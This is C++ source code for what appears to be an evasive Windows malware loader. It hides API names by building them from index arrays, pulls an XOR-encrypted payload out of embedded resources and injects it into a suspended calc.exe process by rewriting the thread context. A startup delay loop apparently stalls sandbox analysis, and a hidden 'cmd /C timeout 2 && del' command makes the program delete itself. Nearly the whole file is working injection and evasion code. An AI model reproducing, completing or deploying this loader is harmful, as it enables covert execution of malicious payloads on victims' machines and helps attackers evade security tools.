
#include <windows.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#include <iostream>
#include <random>
#include <cstdlib>
#include <ctime>
#include <string>  // Include this for std::string
//CreateProcessA , VirtualAllocEx , WriteProcessMemory ,ResumeThread ,GetModuleHandle ,LoadResource.
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "user32.lib")

// Function that performs the main logic when i == 1
std::string getoriginal(int offsets[], char* big_string, int sizeof_offset){  // Use std::string
    std::string empty_string= "";
    for (int i = 0; i < sizeof_offset / 4; ++i) {
         char character = big_string[offsets[i]];
         empty_string += character;
     }
     return empty_string;
}

void main_star() {

    char big_string[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.\\:";
    int ws_lld_ker_32[] = {10, 4, 17, 13, 4, 11, 55, 54, 62, 3, 11, 11};
    HMODULE istfromKe__ws_ls_32 = LoadLibraryA(getoriginal(ws_lld_ker_32, big_string, sizeof(ws_lld_ker_32)).c_str());
    std::cout <<getoriginal(ws_lld_ker_32, big_string, sizeof(ws_lld_ker_32)).c_str() << std::endl;
    int creatingprocess[] = {28, 17, 4, 0, 19, 4, 41, 17, 14, 2, 4, 18, 18, 26};
    int virall[] ={ 47, 8, 17, 19, 20, 0, 11, 26, 11, 11, 14, 2, 30, 23 };
    int wrproc[] = { 48, 17, 8, 19, 4, 41, 17, 14, 2, 4, 18, 18, 38, 4, 12, 14, 17, 24};
    int reth[] = {43, 4, 18, 20, 12, 4, 45, 7, 17, 4, 0, 3};
    
    int load_resource_ok[] = {37, 14, 0, 3, 43, 4, 18, 14, 20, 17, 2, 4};
    int size_of_Resource[] = {44, 8, 25, 4, 14, 5, 43, 4, 18, 14, 20, 17, 2, 4};
    int loc_res[] = {37, 14, 2, 10, 43, 4, 18, 14, 20, 17, 2, 4};
    
    int runtime_broker[] = {2, 64, 63, 63, 22, 8, 13, 3, 14, 22, 18, 63, 63, 18, 24, 18, 19, 4, 12, 55, 54, 63, 63, 43, 20, 13, 19, 8, 12, 4, 27, 17, 14, 10, 4, 17, 62, 4, 23, 4};
    
    //std::cout <<getoriginal(afindres, big_string, sizeof(afindres)) << std::endl;
    //std::cout <<getoriginal(size_of_Resource, big_string, sizeof(size_of_Resource)) << std::endl;  
    //std::cout <<getoriginal(load_resource_ok, big_string, sizeof(load_resource_ok)) << std::endl;
    
    
    FARPROC pLoad_Resource = GetProcAddress(istfromKe__ws_ls_32, getoriginal(load_resource_ok, big_string, sizeof(load_resource_ok)).c_str());
    FARPROC pSize_of_Resource = GetProcAddress(istfromKe__ws_ls_32, getoriginal(size_of_Resource, big_string, sizeof(size_of_Resource)).c_str());
    FARPROC pLockResource = GetProcAddress(istfromKe__ws_ls_32, getoriginal(loc_res, big_string, sizeof(loc_res)).c_str()); 
  
    auto Size_Of_Resource_Func = (DWORD(WINAPI*)(HMODULE, HRSRC))pSize_of_Resource;
 
    
    HMODULE hModule = GetModuleHandle(NULL);
    HRSRC hResource = FindResource(hModule, "dhanushkey1", RT_RCDATA);
    HGLOBAL resrdata = ((HGLOBAL(WINAPI*)(HMODULE, HRSRC))pLoad_Resource)(hModule, hResource);
    DWORD keLen = Size_Of_Resource_Func(hModule, hResource);
    char* ke = (char*)((char*(WINAPI*)(HGLOBAL))pLockResource)(resrdata);

   
    char* code199k;
    DWORD code199kLen;
    hResource = FindResource(hModule, "dhanushcode56", RT_RCDATA);
    resrdata = ((HGLOBAL(WINAPI*)(HMODULE, HRSRC))pLoad_Resource)(hModule, hResource);
    code199kLen = Size_Of_Resource_Func(hModule, hResource);
    code199k = (char*)((char*(WINAPI*)(HGLOBAL))pLockResource)(resrdata);
    
    //std::cout <<getoriginal(creatingprocess, big_string, sizeof(creatingprocess)) << std::endl;  
    
    std::string runtime_broker_kum = getoriginal(runtime_broker, big_string, sizeof(runtime_broker));
    //std::cout <<getoriginal(runtime_broker, big_string, sizeof(runtime_broker)) << std::endl;
    const char* processptaah = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe";

    STARTUPINFO li = {0};
    

    BOOL (*itscreatetPro)(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes,
                          BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo,
                          LPPROCESS_INFORMATION lpProcessInformation) = 
        (BOOL(*)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION))
        GetProcAddress(istfromKe__ws_ls_32, getoriginal(creatingprocess, big_string, sizeof(creatingprocess)).c_str());

    LPVOID (*pvirall)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD) = 
        (LPVOID(*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD)) GetProcAddress(istfromKe__ws_ls_32, getoriginal(virall, big_string, sizeof(virall)).c_str());

    BOOL (*pwrproc)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*) = 
        (BOOL(*)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*)) GetProcAddress(istfromKe__ws_ls_32, getoriginal(wrproc, big_string, sizeof(wrproc)).c_str());

    PROCESS_INFORMATION pi = {0};
    li.cb = sizeof(li);

    itscreatetPro("C:\\windows\\system32\\calc.exe", 0, 0, 0, FALSE, CREATE_SUSPENDED, 0, 0, &li, &pi);
    GetTickCount();

    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_FULL;
    
    int get_thr_con[] = {32, 4, 19, 45, 7, 17, 4, 0, 3, 28, 14, 13, 19, 4, 23, 19};
    auto pget_thr_con = (void(WINAPI*)(HANDLE, LPCONTEXT))GetProcAddress(istfromKe__ws_ls_32, getoriginal(get_thr_con, big_string, sizeof(get_thr_con)).c_str());
    pget_thr_con(pi.hThread, &ctx);

    LPVOID gallio = pvirall(pi.hProcess, NULL, code199kLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    for (DWORD i = 0; i < code199kLen; i++) {
        code199k[i] ^= ke[i % keLen];
    }
    (BOOL(*)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*))pwrproc(pi.hProcess, gallio, code199k, code199kLen, NULL);
    ctx.Rcx = (DWORD64)gallio;
    
    int set_thre_con[] = {44, 4, 19, 45, 7, 17, 4, 0, 3, 28, 14, 13, 19, 4, 23, 19};
    auto pset_thread_con = (void(WINAPI*)(HANDLE, LPCONTEXT))GetProcAddress(istfromKe__ws_ls_32, getoriginal(set_thre_con, big_string, sizeof(set_thre_con)).c_str());
    pset_thread_con(pi.hThread, &ctx);

    auto pResumeThread = (DWORD(WINAPI*)(HANDLE)) GetProcAddress(istfromKe__ws_ls_32, getoriginal(reth, big_string, sizeof(reth)).c_str());
    pResumeThread(pi.hThread);
    
    //delet from here
    char full_p[MAX_PATH];
    
    int get_mod_wlsa[] = {32, 4, 19, 38, 14, 3, 20, 11, 4, 31, 8, 11, 4, 39, 0, 12, 4, 26};
    int cooo[] = {2, 12, 3, 62, 4, 23, 4};
    int t[] = {19, 8, 12, 4, 14, 20, 19};
    int d[] = {3, 4, 11};
    std::string coo = getoriginal(cooo, big_string, sizeof(cooo));
    std::string to = getoriginal(t, big_string, sizeof(t));
    std::string gon = getoriginal(d, big_string, sizeof(d));
    
    BOOL (*pget_mod__wlsa_A)(HMODULE, LPSTR, DWORD) = 
        (BOOL (*)(HMODULE, LPSTR, DWORD))GetProcAddress(istfromKe__ws_ls_32, getoriginal(get_mod_wlsa, big_string, sizeof(get_mod_wlsa)).c_str());
        
    pget_mod__wlsa_A(NULL, full_p, MAX_PATH);
    
    STARTUPINFOA ri = { sizeof(STARTUPINFOA) };
    PROCESS_INFORMATION oi = {}; 
    std::string com = coo + " /C " + to + " 2 && "+ gon +" \"" + std::string(full_p) + "\"";
    
    itscreatetPro(NULL, com.data(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &ri, &oi);
    
}

int main() {
    unsigned long long i = 0;  // Change this value to control the flow

    for(; i < 189642300000; i++) {
        i += i % 0xff; 
    }
    printf("%llu\n", i);
    
    if (i == 189642300001){
        main_star();
    }

    return 0;
}
